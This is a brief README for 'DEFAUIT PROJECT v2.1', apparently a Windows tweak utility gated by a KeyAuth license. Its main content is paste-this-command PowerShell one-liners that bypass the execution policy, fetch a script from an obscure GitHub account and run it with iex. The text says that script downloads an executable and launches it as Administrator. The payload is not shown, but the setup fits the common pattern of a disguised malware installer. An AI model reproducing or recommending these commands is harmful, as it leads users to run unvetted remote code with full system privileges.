# DEFAUIT PROJECT v2.1

Run DEFAUIT without installing it.

## Run (one line)

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/darapedbxystyle-hub/DEFAUIT-PROJECT/main/run.ps1 | iex"
```

This downloads `DEFAUIT.exe` to `%TEMP%\DEFAUIT-Run`, verifies SHA256, and launches it as Administrator. No shortcuts and no LocalAppData install are created.

## Install with shortcuts (optional)

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/darapedbxystyle-hub/DEFAUIT-PROJECT/main/install.ps1 | iex"
```

## Portable ZIP

Download `DEFAUIT-PROJECT-v2.1-Portable.zip`, extract it, then:

- `Run without install.cmd` - run without installing
- `Run DEFAUIT.cmd` - install with shortcuts

## Notes

- Requires Windows 10/11 x64, a valid KeyAuth license key, and internet access.
- The app runs as Administrator because it applies system-level tweaks.
- SHA256: `7B6EB91E136F9043CBF396B8CA83945674BFBC5C2F0F3DBE0177FEBF6F273828`
